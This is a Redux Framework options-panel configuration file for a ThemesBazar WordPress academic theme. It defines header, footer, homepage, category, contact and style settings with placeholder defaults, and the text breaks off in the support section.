<?php
    /**
     * ReduxFramework Sample Config File
     * For full documentation, please visit: http://docs.reduxframework.com/
     */

    if ( ! class_exists( 'Redux' ) ) {
        return;
    }


    // This is your option name where all the Redux data is stored.
    $opt_name = "themesbazar";

    // This line is only for altering the demo. Can be easily removed.
    $opt_name = apply_filters( 'themesbazar/opt_name', $opt_name );

    /*
     *
     * --> Used within different fields. Simply examples. Search for ACTUAL DECLARATION for field examples
     *
     */

    $sampleHTML = '';
    if ( file_exists( dirname( __FILE__ ) . '/info-html.html' ) ) {
        Redux_Functions::initWpFilesystem();

        global $wp_filesystem;

        $sampleHTML = $wp_filesystem->get_contents( dirname( __FILE__ ) . '/info-html.html' );
    }

    // Background Patterns Reader
    $sample_patterns_path = ReduxFramework::$_dir . '../sample/patterns/';
    $sample_patterns_url  = ReduxFramework::$_url . '../sample/patterns/';
    $sample_patterns      = array();
    
    if ( is_dir( $sample_patterns_path ) ) {

        if ( $sample_patterns_dir = opendir( $sample_patterns_path ) ) {
            $sample_patterns = array();

            while ( ( $sample_patterns_file = readdir( $sample_patterns_dir ) ) !== false ) {

                if ( stristr( $sample_patterns_file, '.png' ) !== false || stristr( $sample_patterns_file, '.jpg' ) !== false ) {
                    $name              = explode( '.', $sample_patterns_file );
                    $name              = str_replace( '.' . end( $name ), '', $sample_patterns_file );
                    $sample_patterns[] = array(
                        'alt' => $name,
                        'img' => $sample_patterns_url . $sample_patterns_file
                    );
                }
            }
        }
    }

    /**
     * ---> SET ARGUMENTS
     * All the possible arguments for Redux.
     * For full documentation on arguments, please refer to: https://github.com/ReduxFramework/ReduxFramework/wiki/Arguments
     * */

    $theme = wp_get_theme(); // For use with some settings. Not necessary.

    $args = array(
        // TYPICAL -> Change these values as you need/desire
        'opt_name'             => $opt_name,
        // This is where your data is stored in the database and also becomes your global variable name.
        'display_name'         => $theme->get( 'Name' ),
        // Name that appears at the top of your panel
        'display_version'      => $theme->get( 'Version' ),
        // Version that appears at the top of your panel
        'menu_type'            => 'menu',
        //Specify if the admin menu should appear or not. Options: menu or submenu (Under appearance only)
        'allow_sub_menu'       => true,
        // Show the sections below the admin menu item or not
        'menu_title'           => __( 'Theme Options', 'ThemesBazar' ),
        'page_title'           => __( 'Themesbazar.com Themes Options', 'ThemesBazar' ),
        // You will need to generate a Google API key to use this feature.
        // Please visit: https://developers.google.com/fonts/docs/developer_api#Auth
        'google_api_key'       => '',
        // Set it you want google fonts to update weekly. A google_api_key value is required.
        'google_update_weekly' => false,
        // Must be defined to add google fonts to the typography module
        'async_typography'     => true,
        // Use a asynchronous font on the front end or font string
        //'disable_google_fonts_link' => true,                    // Disable this in case you want to create your own google fonts loader
        'admin_bar'            => true,
        // Show the panel pages on the admin bar
        'admin_bar_icon'       => 'dashicons-portfolio',
        // Choose an icon for the admin bar menu
        'admin_bar_priority'   => 50,
        // Choose an priority for the admin bar menu
        'global_variable'      => '',
        // Set a different name for your global variable other than the opt_name
        'dev_mode'             => false,
        // Show the time the page took to load, etc
        'update_notice'        => false,
        // If dev_mode is enabled, will notify developer of updated versions available in the GitHub Repo
        'customizer'           => false,
        // Enable basic customizer support
        //'open_expanded'     => true,                    // Allow you to start the panel in an expanded way initially.
        //'disable_save_warn' => true,                    // Disable the save warning when a user changes a field

        // OPTIONAL -> Give you extra features
        'page_priority'        => 10,
        // Order where the menu appears in the admin area. If there is any conflict, something will not show. Warning.
        'page_parent'          => 'themes.php',
        // For a full list of options, visit: http://codex.wordpress.org/Function_Reference/add_submenu_page#Parameters
        'page_permissions'     => 'manage_options',
        // Permissions needed to access the options panel.
        'menu_icon'            => '',
        // Specify a custom URL to an icon
        'last_tab'             => '',
        // Force your panel to always open to a specific tab (by id)
        'page_icon'            => 'icon-themes',
        // Icon displayed in the admin panel next to your menu_title
        'page_slug'            => '',
        // Page slug used to denote the panel, will be based off page title then menu title then opt_name if not provided
        'save_defaults'        => true,
        // On load save the defaults to DB before user clicks save or not
        'default_show'         => false,
        // If true, shows the default value next to each field that is not the default value.
        'default_mark'         => '',
        // What to print by the field's title if the value shown is default. Suggested: *
        'show_import_export'   => true,
        // Shows the Import/Export panel when not used as a field.

        // CAREFUL -> These options are for advanced use only
        'transient_time'       => 60 * MINUTE_IN_SECONDS,
        'output'               => true,
        // Global shut-off for dynamic CSS output by the framework. Will also disable google fonts output
        'output_tag'           => true,
        // Allows dynamic CSS to be generated for customizer and google fonts, but stops the dynamic CSS from going to the head
        // 'footer_credit'     => '',                   // Disable the footer credit of Redux. Please leave if you can help it.

        // FUTURE -> Not in use yet, but reserved or partially implemented. Use at your own risk.
        'database'             => '',
        // possible: options, theme_mods, theme_mods_expanded, transient. Not fully functional, warning!
        'use_cdn'              => true,
        // If you prefer not to use the CDN for Select2, Ace Editor, and others, you may download the Redux Vendor Support plugin yourself and run locally or embed it in your code.

        // HINTS
        'hints'                => array(
            'icon'          => 'el el-question-sign',
            'icon_position' => 'right',
            'icon_color'    => 'lightgray',
            'icon_size'     => 'normal',
            'tip_style'     => array(
                'color'   => 'red',
                'shadow'  => true,
                'rounded' => false,
                'style'   => '',
            ),
            'tip_position'  => array(
                'my' => 'top left',
                'at' => 'bottom right',
            ),
            'tip_effect'    => array(
                'show' => array(
                    'effect'   => 'slide',
                    'duration' => '500',
                    'event'    => 'mouseover',
                ),
                'hide' => array(
                    'effect'   => 'slide',
                    'duration' => '500',
                    'event'    => 'click mouseleave',
                ),
            ),
        )
    );

    // ADMIN BAR LINKS -> Setup custom links in the admin bar menu as external items.
    $args['admin_bar_links'][] = array(
        'id'    => 'redux-docs',
        'href'  => 'http://docs.reduxframework.com/',
        'title' => __( 'Documentation', 'ThemesBazar' ),
    );

    $args['admin_bar_links'][] = array(
        //'id'    => 'redux-support',
        'href'  => 'https://github.com/ReduxFramework/redux-framework/issues',
        'title' => __( 'Support', 'ThemesBazar' ),
    );

    $args['admin_bar_links'][] = array(
        'id'    => 'redux-extensions',
        'href'  => 'reduxframework.com/extensions',
        'title' => __( 'Extensions', 'ThemesBazar' ),
    );

    // SOCIAL ICONS -> Setup custom links in the footer for quick links in your panel footer icons.
    $args['share_icons'][] = array(
        'url'   => 'https://github.com/themesbazar',
        'title' => 'Visit us on GitHub',
        'icon'  => 'el el-github'
        //'img'   => '', // You can use icon OR img. IMG needs to be a full URL.
    );
    $args['share_icons'][] = array(
        'url'   => 'https://www.facebook.com/themesbazar/',
        'title' => 'Like us on Facebook',
        'icon'  => 'el el-facebook'
    );
    $args['share_icons'][] = array(
        'url'   => 'https://twitter.com/themesbazar',
        'title' => 'Follow us on Twitter',
        'icon'  => 'el el-twitter'
    );
    $args['share_icons'][] = array(
        'url'   => 'https://www.linkedin.com/company/themesbazar.com/',
        'title' => 'Find us on LinkedIn',
        'icon'  => 'el el-linkedin'
    );

    // Panel Intro text -> before the form
    if ( ! isset( $args['global_variable'] ) || $args['global_variable'] !== false ) {
        if ( ! empty( $args['global_variable'] ) ) {
            $v = $args['global_variable'];
        } else {
            $v = str_replace( '-', '_', $args['opt_name'] );
        }
        $args['intro_text'] = sprintf( __( '', 'ThemesBazar' ), $v );
    } else {
        $args['intro_text'] = __( '<p>This text is displayed above the options panel. It isn\'t required, but more info is always better! The intro_text field accepts all HTML.</p>', 'ThemesBazar' );
    }

    // Add content after the form.
    $args['footer_text'] = __( '', 'ThemesBazar' );

    Redux::setArgs( $opt_name, $args );

    /*
     * ---> END ARGUMENTS
     */


    /*
     * ---> START HELP TABS
     */

    $tabs = array(
        array(
            'id'      => 'redux-help-tab-1',
            'title'   => __( 'Theme Information 1', 'ThemesBazar' ),
            'content' => __( '<p>This is the tab content, HTML is allowed.</p>', 'ThemesBazar' )
        ),
        array(
            'id'      => 'redux-help-tab-2',
            'title'   => __( 'Theme Information 2', 'ThemesBazar' ),
            'content' => __( '<p>This is the tab content, HTML is allowed.</p>', 'ThemesBazar' )
        )
    );
    Redux::setHelpTab( $opt_name, $tabs );

    // Set the help sidebar
    $content = __( '<p>This is the sidebar content, HTML is allowed.</p>', 'ThemesBazar' );
    Redux::setHelpSidebar( $opt_name, $content );


    /*
     * <--- END HELP TABS
     */


    /*
     *
     * ---> START SECTIONS
     *
     */

    /*

        As of Redux 3.5+, there is an extensive API. This API can be used in a mix/match mode allowing for


     ////////////////////////// */

    
	Redux::setSection( $opt_name, array(
        'title'            => __( 'Activation Theme', 'ThemesBazar' ),
        'id'               => 'purchase_theme',
        'icon'             => 'el el-home',
       'fields'           => array(
            array(
                'id'       => 'v_id',
                'type'     => 'password',
                'title'    => __( 'Theme Purchase code', 'ThemesBazar' ),
                'subtitle' => __( 'Please Active Your Theme', 'ThemesBazar' ),
                'desc' => __( 'For activation code Please Contect Themesbazar Helpline', 'ThemesBazar' ),
                'default'  => '121',
            ),
        ),
    ) );

	

    // -> ----------------------START Header Option----------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Header Options', 'ThemesBazar' ),
        'id'               => 'header',
        'icon'             => 'el el-home',
       'fields'           => array(
            
			
				array(
				'id' => 'top-header',
				'type' => 'button_set',
				   'options' => array(
				  '1' => 'Top Header Option', 
					  ),
				  'default' => '1'
					  
			  ),
			  
			  
			array(
                'id'       => 'top-hed',
                'type'     => 'text',
                'title'    => __( 'Top Header Title ', 'ThemesBazar' ),
                'default'  => ' FIRST PRIVATE UNIVERSITY IN BARISAL',
            ),		
			

		array(
			    'title' => __('Social Profiles', 'ThemesBazar'),
				'id' => 'social-link',
				'type' => 'text',
				'options' => array(
					'facebook-url' => 'Facebook Link',
					'twitter-url' => 'Twitter Link',
					'googleplus-url' => 'Googleplus Link',
					'instagram-url' => 'Instagram Link',
					'youtube-url' => 'Youtube Link',
			
					),
					'default' => array(
						'facebook-url' => 'https://www.facebook.com/themesbazar/',
						'twitter-url' => 'https://twitter.com/themesbazar',
						'googleplus-url' => 'https://plus.google.com/u/0/105425294191118715092',
						'instagram-url' => 'themesbazar.com',
						'youtube-url' => 'https://www.youtube.com/channel/UCFUeGmdXrBAb8o_3X9Evywg',
			       )
				
			  ),
			  

			array(
				'id' => 'header',
				'type' => 'button_set',
				   'options' => array(
				  '1' => 'Header Option', 
					  ),
				  'default' => '1'
					  
			  ),
				
			array(
                'id'       => 'logo_upload',
                'type'     => 'media',
                'title'    => __( 'Logo Uploader', 'ThemesBazar' ),
                'subtitle' => __( 'Upload Your Logo', 'ThemesBazar' ),
                'compiler'  => true,
                'default'  => array(
                    'url' => get_template_directory_uri().'/assets/img/logo.png',
                )
				),
				
            array(
                'id'       => 'favicon',
                'type'     => 'media',
                'title'    => __( 'Favicon Uploader', 'ThemesBazar' ),
                'subtitle' => __( 'Upload Your Favicon png Formet', 'ThemesBazar' ),
                'compiler'  => true,
                'default'  => array(
                    'url' => get_template_directory_uri().'/assets/img/favicon.png',
                )
				),
				
	
				
			array(
                'id'       => 'phone-t',
                'type'     => 'text',
                'title'    => __( 'Phone Title Text', 'ThemesBazar' ),
                'default'  => '  Reception ',
            ),
			
			
			array(
                'id'       => 'phone-nu',
                'type'     => 'text',
                'title'    => __( 'Phone Number Title Text', 'ThemesBazar' ),
                'default'  => '  + (123) 1000-567-800 ',
            ),
			
			array(
                'id'       => 'header-icon-one',
                'type'     => 'text',
                'title'    => __( 'Header One Icon', 'ThemesBazar' ),
				'desc'      => __('<a href="https://fontawesome.com/v4.7.0/icons/" 
				target="_blank"> Click Here For More Icons </a>', 'ThemesBazar' ),
                'default'  => 'fa fa-phone',
            ),
			

			array(
                'id'       => 'gmail-t',
                'type'     => 'text',
                'title'    => __( 'E-mail Title Text', 'ThemesBazar' ),
                'default'  => '   Email  ',
            ),

			
			array(
                'id'       => 'gmail-a',
                'type'     => 'text',
                'title'    => __( 'E-mail Address Text', 'ThemesBazar' ),
                'default'  => 'Support@gmail.com',
        	),
				
			array(
                'id'       => 'header-icon-two',
                'type'     => 'text',
                'title'    => __( 'Header Icon Two', 'ThemesBazar' ),
				'desc'      => __('<a href="https://fontawesome.com/v4.7.0/icons/" 
				target="_blank"> Click Here For More Icons </a>', 'ThemesBazar' ),
                'default'  => 'fa fa-envelope-o',
            ),
	
			
			
			
			array(
                'id'       => 'loction-t-one',
                'type'     => 'text',
                'title'    => __( 'Location Title Text', 'ThemesBazar' ),
                'default'  => ' Location ',
            ),

			
			array(
                'id'       => 'loction-t-two',
                'type'     => 'text',
                'title'    => __( 'Location Address Text', 'ThemesBazar' ),
                'default'  => '  Mirpur-01, Dhaka-1000  ',
        	),
								
			array(
                'id'       => 'header-icon-three',
                'type'     => 'text',
                'title'    => __( 'Header Icon Three', 'ThemesBazar' ),
				'desc'      => __('<a href="https://fontawesome.com/v4.7.0/icons/" 
				target="_blank"> Click Here For More Icons </a>', 'ThemesBazar' ),
                'default'  => 'fa fa-map-marker',
            ),
	
					

           
        )


    
    ) );


// -> ----------------------START Footer Option----------------------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Footer Options', 'ThemesBazar' ),
        'id'               => 'footer',
        'icon'             => 'el el-th',
       'fields'           => array(

		
			
				
			  
			array(
				'id' => 'foote-menu',
				'type' => 'button_set',
				   'options' => array(
				  '1' => 'Footer Menu Title Option', 
					  ),
				  'default' => '1'
					  
			  ),
			  
			array(
                'id'       => 'f-menu-one',
                'type'     => 'text',
                'title'    => __( 'Footer Menu Title Text', 'ThemesBazar' ),
                'default'  => 'Honours Department Link',
            ),
						
			array(
                'id'       => 'f-menu-two',
                'type'     => 'text',
                'title'    => __( 'Footer Menu Title Text', 'ThemesBazar' ),
                'default'  => ' Student login Link  ',
            ),
								
			array(
                'id'       => 'f-menu-three',
                'type'     => 'text',
                'title'    => __( 'Footer Menu Title Text', 'ThemesBazar' ),
                'default'  => 'Student Registration Link  ',
            ),
			
			array(
                'id'       => 'f-menu-four',
                'type'     => 'text',
                'title'    => __( 'Footer Menu Title Text', 'ThemesBazar' ),
                'default'  => ' Contact Address',
            ),
						
	
				array(
				'id' => 'footer-add',
				'type' => 'button_set',
				   'options' => array(
				  '1' => 'Footer Address Option', 
					  ),
				  'default' => '1'
					  
			  ),
			
			array(
                'id'       => 'f-address',
                'type'     => 'editor',
                'title'    => __( 'Footer Address Text', 'ThemesBazar' ),
                'default'  => ' Address: Road No. 00, Mirpur R/A, Dhaka: 0000, Bangladesh. ',
            ),
				
			
			array(
                'id'       => 'f-phone',
                'type'     => 'text',
                'title'    => __( 'Footer Phone Title Text', 'ThemesBazar' ),
                'default'  => ' Phone: +8801800000000 ',
            ),	
			array(
                'id'       => 'fax',
                'type'     => 'text',
                'title'    => __( 'Footer Fax Title Text', 'ThemesBazar' ),
                'default'  => ' Fax: +88-000-0000000  ',
            ),
			
			array(
                'id'       => 'f-gmail',
                'type'     => 'text',
                'title'    => __( 'Footer E-Mail Text', 'ThemesBazar' ),
                'default'  => ' Gmail:Support@gmail.com ',
            ),
			
									
			array(
                'id'       => 'f-code',
                'type'     => 'text',
                'title'    => __( 'Footer EIIN Text', 'ThemesBazar' ),
                'default'  => ' EIIN- 000000, NU Code- 0000  ',
            ),
			
			array(
                'id'       => 'college-code',
                'type'     => 'text',
                'title'    => __( 'College Code Text', 'ThemesBazar' ),
                'default'  => ' College Code: 0000 ',
            ),
						
			
           array(
                'id'       => 'copyright',
                'type'     => 'editor',
                'title'    => __( 'Copyright Text', 'ThemesBazar' ),
                'default'  => '&copy; All rights reserved &copy; 2020 Acadcmic Theme',
            ),
           

        )


    
    ) );

// -> ----------------------START Category Option-------------------------------------#

Redux::setSection( $opt_name, array(
        'title'            => __( 'Homepage Settings', 'ThemesBazar' ),
        'id'               => 'home',
        'icon'             => 'el el-cog',
       'fields'           => array(
			
			
			array(
				'id'      => 'homepage-section',
				'type'    => 'sorter',
				'title'   => 'Homepage Layout Manager',
				'desc'    => 'Organize how you want the layout to appear on the homepage',
				'options' => array(
					'Show'  => array(
						'section-one' => 'Home Slider',
						'section-two'     => 'History',
						'section-three' => 'Speech',
						'section-four'   => 'Information',
						'section-five'   => ' Acadcmics',
						'section-six'   => 'Counter List',
						'section-seven'   => ' Teacher ',
						'section-eight'   => ' Video Section ',
						'section-nine'   => ' Latest News ',
					
					
					),
					'Hide' => array(
					)
				),
			),


				array(
					'id' => 'section-one',
					'type' => 'button_set',
					   'options' => array(
					  '1' => ' Home Gallery', 
						  ),
					  'default' => '1'
						  
				  ),
				  
				array(
					'id'       => 'how_post_home',
					'type'     => 'text',
					'title'    => __( 'How  Post Show in Home Gallery', 'ThemesBazar' ),
					'default'  =>4,
				),
				
						
				
				array(
					'id' => 'section-two',
					'type' => 'button_set',
					   'options' => array(
					  '1' => ' About Section', 
						  ),
					  'default' => '1'
						  
				  ),
				  
			array(
                'id'       => 'read-more',
                'type'     => 'text',
                'title'    => __( 'Read More Button Text', 'ThemesBazar' ),
                'default'  => 'Read More..',
				),
				
			array(
				'id'       => 'excerpt-about',
				'type'     => 'text',
				'title'    => __( 'How Many Word Show in About Us Content', 'ThemesBazar' ),
				'default'  =>80,
			),
			
				
				
				  
				  
				array(
					'id' => 'section-three',
					'type' => 'button_set',
					   'options' => array(
					  '1' => ' Speech Section', 
						  ),
					  'default' => '1'
						  
				  ),
				  
			
			array(
				'id'       => 'excerpt-speech',
				'type'     => 'text',
				'title'    => __( 'How Many Word Show in Speech Content', 'ThemesBazar' ),
				'default'  =>60,
			),
				
					
				array(
					'id' => 'conter-sect',
					'type' => 'button_set',
					   'options' => array(
					  '1' => ' Counter Section', 
						  ),
					  'default' => '1'
						  
				),
			
							
			array(
                'id'       => 'item-t-one',
                'type'     => 'text',
                'title'    => __( 'Item One List Text', 'ThemesBazar' ),
                'default'  => '50',
            ),
									
			array(
                'id'       => 'item-cont-one',
                'type'     => 'text',
                'title'    => __( 'Item One Title Text', 'ThemesBazar' ),
                'default'  => 'Teachers',
            ),
			
									
			array(
                'id'       => 'item-t-two',
                'type'     => 'text',
                'title'    => __( 'Item Two List Text', 'ThemesBazar' ),
                'default'  => '15',
            ),
									
			array(
                'id'       => 'item-cont-two',
                'type'     => 'text',
                'title'    => __( 'Item Two Title Text', 'ThemesBazar' ),
                'default'  => 'Departments',
            ),
			
												
			array(
                'id'       => 'item-t-three',
                'type'     => 'text',
                'title'    => __( 'Item Three List Text', 'ThemesBazar' ),
                'default'  => '500',
            ),
									
			array(
                'id'       => 'item-cont-three',
                'type'     => 'text',
                'title'    => __( 'Item Three Title Text', 'ThemesBazar' ),
                'default'  => 'Class Room',
            ),
			
															
			array(
                'id'       => 'item-t-four',
                'type'     => 'text',
                'title'    => __( 'Item Four List Text', 'ThemesBazar' ),
                'default'  => '1700',
            ),
									
			array(
                'id'       => 'item-cont-four',
                'type'     => 'text',
                'title'    => __( 'Item Four Title Text', 'ThemesBazar' ),
                'default'  => 'Students',
            ),
			
			

				
				array(
					'id' => 'section-four',
					'type' => 'button_set',
					   'options' => array(
					  '1' => '  Acadcmics Section', 
						  ),
					  'default' => '1'
						  
				  ),
			
			array(
                'id'       => 'acadcmi-t',
                'type'     => 'text',
                'title'    => __( ' Acadcmics  Title Text', 'ThemesBazar' ),
                'default'  => ' Acadcmics ',
            ),
			
			array(
				'id'       => 'how_post_acadcmics',
				'type'     => 'text',
				'title'    => __( 'How  Post Show in Acadcmics Section', 'ThemesBazar' ),
				'default'  =>10,
			),
			
	
			
			array(
				'id' => 'section-six',
				'type' => 'button_set',
				   'options' => array(
				  '1' => ' Video Section ', 
					  ),
				  'default' => '1'
					  
			),
					
			array(
                'id'       => 'video-t',
                'type'     => 'text',
                'title'    => __( ' Video  Title Text', 'ThemesBazar' ),
                'default'  => '  Video Section  ',
            ),
			
			array(
				'id'       => 'how_post_video',
				'type'     => 'text',
				'title'    => __( 'How  Post Show in Video Section', 'ThemesBazar' ),
				'default'  =>10,
			),
					
				
  			
					

			array(
					'id' => 'section-nine',
					'type' => 'button_set',
					   'options' => array(
					  '1' => ' Latest News Section', 
						  ),
					  'default' => '1'
						  
				),
				
			array(
                'id'       => 'latest-t',
                'type'     => 'text',
                'title'    => __( 'Latest Title Text', 'ThemesBazar' ),
                'default'  => ' Latest News',
            ),
				  			
	
			array(
				'id'       => 'excerpt-latest',
				'type'     => 'text',
				'title'    => __( 'How Many Word Show in Content', 'ThemesBazar' ),
				'default'  =>30,
			),
			
			array(
				'id'       => 'how_post_latest',
				'type'     => 'text',
				'title'    => __( 'How  Post Show in Section', 'ThemesBazar' ),
				'default'  =>10,
			),
			
			
									
			array(
                'id'       => 'latest-btn',
                'type'     => 'text',
                'title'    => __( 'Read More Button Text', 'ThemesBazar' ),
                'default'  => 'Read More ',
            ),
					
				
				
			
				
				

        )


    
    ) );




// -> ---------------------- Teachers & Students Category ----------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Teachers Students & Others Category  Options', 'ThemesBazar' ),
        'id'               => 'teacher_info',
        'icon'             => 'el el-list',
       'fields'           => array(

	 
				
	
			
			array(
                'id'       => 'cat-one',
                'type'     => 'select',
                'title'    => __( '1st Category', 'ThemesBazar' ),
                'subtitle'  => __( 'Please Select Your Category', 'ThemesBazar' ),
                'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'ThemesBazar' ),
                'default'  => '1',
                'data'  => 'category',
            ),	
			
			
			
			array(
				'id'       => 'how_post_teachers',
				'type'     => 'text',
				'title'    => __( 'How  Post Show in  Section', 'ThemesBazar' ),
				'default'  =>10,
			),
			
			
			
            ),
	   
			
		   
        
    
    ) );






// -> ---------------------- Information Category ----------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Information Category  Options', 'ThemesBazar' ),
        'id'               => 'infor',
        'icon'             => 'el el-list',
       'fields'           => array(

	        array(
                'id'       => 'information-cats',
                'type'     => 'select',
				
                'title'    => __( 'Choose your categories', 'ThemesBazar' ),
                //'desc'      => __( '1st Create Category From Posts-> Category, Then Select Here.', 'ThemesBazar' ),
				
				'data' => 'terms',
				'multi'   => true,
				'args' => array(
				'post_type' => 'information',
					'taxonomies' => array( 'infocats' ),
					'hide_empty' => false,
				),
				
            ),
	   
	   
	   	array(
                'id'       => 'tab-t',
                'type'     => 'text',
                'title'    => __( 'Information Title Text', 'ThemesBazar' ),
                'default'  => ' Informations',
            ),
				
			
			
			
			array(
					'id' => 'section-info',
					'type' => 'button_set',
					   'options' => array(
					  '1' => ' Information Category Page', 
						  ),
					  'default' => '1'
						  
				),
		  		
			
			    array(
                'id'        => 'in-dat',
                'type'      => 'text',
                'title'     => __( 'Date Title Text', 'ThemesBazar' ),
                'default'   => 'Date',
            ),
			  array(
                'id'        => 'in-tit',
                'type'      => 'text',
                'title'     => __( 'Title Text', 'ThemesBazar' ),
                'default'   => 'Title',
            ),		  
			
			array(
                'id'        => 'in-viwe',
                'type'      => 'text',
                'title'     => __( 'Viwe Title Text', 'ThemesBazar' ),
                'default'   => 'Viwe',
            ),		
			
			array(
                'id'        => 'in-down',
                'type'      => 'text',
                'title'     => __( 'Download Title Text', 'ThemesBazar' ),
                'default'   => 'Download',
            ),
			
		   
        )
		
		     
	

    
    ) );



// -> ----------------------START Archive Page Option-------------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Category Post Options', 'ThemesBazar' ),
        'id'               => 'archive',
        'icon'             => 'el el-indent-right',
       'fields'           => array(
  
            array(
                'id'        => 'nu-title',
                'type'      => 'text',
                'title'     => __( 'Number Title Text', 'ThemesBazar' ),
                'default'   => 'Number',
            ),
			
			array(
                'id'        => 'na-title',
                'type'      => 'text',
                'title'     => __( 'Name Title Text', 'ThemesBazar' ),
                'default'   => 'Name',
            ),
			
			array(
                'id'        => 'des-title',
                'type'      => 'text',
                'title'     => __( 'Designation Title Text', 'ThemesBazar' ),
                'default'   => 'Designation',
            ),
			
			array(
                'id'        => 'img-title',
                'type'      => 'text',
                'title'     => __( 'Image Title Text', 'ThemesBazar' ),
                'default'   => 'Images',
            ),
			
			array(
                'id'        => 'dat-title',
                'type'      => 'text',
                'title'     => __( 'Details Title Text', 'ThemesBazar' ),
                'default'   => 'Details',
            ),
			
			array(
                'id'        => 'red-title',
                'type'      => 'text',
                'title'     => __( 'Red More Details Title Text', 'ThemesBazar' ),
                'default'   => 'Details',
            ),
			
			
		
			
			
			

        )


    
    ) );

	

// -> ----------------------START Contact Page Option----------------------------#

    Redux::setSection( $opt_name, array(
        'title'            => __( 'Contact Page Options', 'ThemesBazar' ),
        'id'               => 'contacts',
        'icon'             => 'el el-phone-alt',
       'fields'           => array(
	   
			
	   						
			array(
                'id'       => 'from-t',
                'type'     => 'text',
                'title'    => __( 'Contact From Title  Text', 'ThemesBazar' ),
                'default'  => '  Leave a Message  ',
            ),
	   	array(
				'id' => 'location',
				'type' => 'button_set',
				   'options' => array(
				  '1' => ' Contact Location Section', 
					  ),
				  'default' => '1'
					  
			),
			  
			   array(
				'id'       => 'location-map',
				'type'     => 'text',
				'title'    => __( 'Location Map Text', 'ThemesBazar' ),
				'default'  => 'https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d116817.76011079275!2d90.28346402873137!3d23.798855593967662!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x3755c0e62ce5a2c5%3A0x8efe33d498b5366!2sThemes+Bazar!5e0!3m2!1sen!2sbd!4v1523176421094',
            ),
			array(
				'id'       => 'map-height',
				'type'     => 'text',
				'title'    => __( 'Google Map Height', 'ThemesBazar' ),
                'default'  => '500',
				),
			 
			
					  	   		
			
			  
			  
			
		   
        )
		
		     
	

    
    ) );

    

    
        // -> ----------------------START Style Option-----------------------------------#
    Redux::setSection( $opt_name, array(
        'title'            => __( 'Style', 'ThemesBazar' ),
        'id'               => 'style',
        'icon'             => 'el el-adjust',
       'fields'           => array(
				
								
		
				
			
				array(
					'id'       => 'body',
					'type'     => 'color',
					'title'    => __('Body Background', 'ThemesBazar'),
					'subtitle' => __('Pick a background color for the theme (default: #fff).', 'ThemesBazar'),
					'default'  => '#F4F1F1',
					'validate' => 'color',
					),
					
					
					
					
					
				array(
					'id'       => 'body-font',
					'type'     => 'typography',
					'title'    => __('Body Font Size', 'ThemesBazar'),
					'subtitle' => __('Please Set Here Body Background Font Size.', 'ThemesBazar'),
					'font-family' => false,
					'font-weight' => false,
					'font-style' => false,
					'font-backup' => false,
					'text-align' => false,
					'line-height' => false,
					'color' => false,
					'default'     => array(  
						 'font-size'   => '17px',
				)
					
				),
				
				
              			  	   		
			array(
				'id' => 'menu',
				'type' => 'button_set',
				   'options' => array(
				  '1' => ' Menu Background & Font Color Section', 
					  ),
				  'default' => '1'
					  
			),
				
				array(
                    'id'       => 'menu-background',
                    'type'     => 'color',
                    'title'    => __('Menu Background', 'ThemesBazar'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'ThemesBazar'),
                    'default'  => '#01284F',
                    'validate' => 'color',
                ),
				
				array(
                    'id'       => 'menu-font',
                    'type'     => 'typography',
                    'title'    => __('Menu Color and Font Size', 'ThemesBazar'),
                    'subtitle' => __('Please Set Here Menu Color and Font Size.', 'ThemesBazar'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
					'font-size' => true,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '16px',  
                         'color'   => '#fff', 
                )
                    
                ),

				
				array(
                    'id'       => 'menu-activ',
                    'type'     => 'color',
                    'title'    => __('Menu Active & Hover Background', 'ThemesBazar'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'ThemesBazar'),
                    'default'  => '#033567',
                    'validate' => 'color',
                ),
						
		

			array(
				'id' => 'footer',
				'type' => 'button_set',
				   'options' => array(
				  '1' => ' Footer Background Section', 
					  ),
				  'default' => '1'
					  
			),

				
				
				array(
                    'id'       => 'footer_background',
                    'type'     => 'color',
                    'title'    => __('Footer Background', 'ThemesBazar'),
                    'subtitle' => __('Pick a background color for the theme (default: #fff).', 'ThemesBazar'),
                    'default'  => '#141414',
                    'validate' => 'color',
                ),
				
				
				
						
				array(
                    'id'       => 'footer-tite',
                    'type'     => 'typography',
                    'title'    => __('Footer Title Color and Font Size', 'ThemesBazar'),
                    'subtitle' => __('Please Set Here Footer Color and Font Size.', 'ThemesBazar'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
					'font-size' => true,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '22px',  
                         'color'   => '#fff', 
                )
                    
                ),

				
				
				array(
                    'id'       => 'footer-font',
                    'type'     => 'typography',
                    'title'    => __('Footer Color and Font Size', 'ThemesBazar'),
                    'subtitle' => __('Please Set Here Footer Color and Font Size.', 'ThemesBazar'),
                    'font-family' => false,
                    'font-weight' => false,
                    'font-style' => false,
                    'font-backup' => false,
                    'text-align' => false,
					'font-size' => true,
                    'line-height' => false,
                    'color' => true,
                    'default'     => array(
                         'font-size'   => '14px',  
                         'color'   => '#c6c6c6', 
                )
                    
                ),
				
				


	
				array(
                    'id'       => 'boottom_footer',
                    'type'     => 'color',
                    'title'    => __('Bottom Footer Background', 'ThemesBazar'),
                    'subtitle' => __('Pick a Bottom Footer background color for the theme (default: #fff).', 'ThemesBazar'),
                    'default'  => '#1A1919',
                    'validate' => 'color',
                ),
				
               
                
				
			
			
           
       )

    ) );
    
    
   
    // -> ----------------------START Support Option--------------------------------#





    Redux::setSection( $opt_name, array(
        'title'            => __( 'Support', 'ThemesBazar' ),
        'id'               => 'support',
        'desc'       => __( '
        <b> ThemesBazar.Com </b> <br/>
        Website : <a href="http://www.themesbazar.com" target="_blank">ThemesBazar.Com</a> <br/>
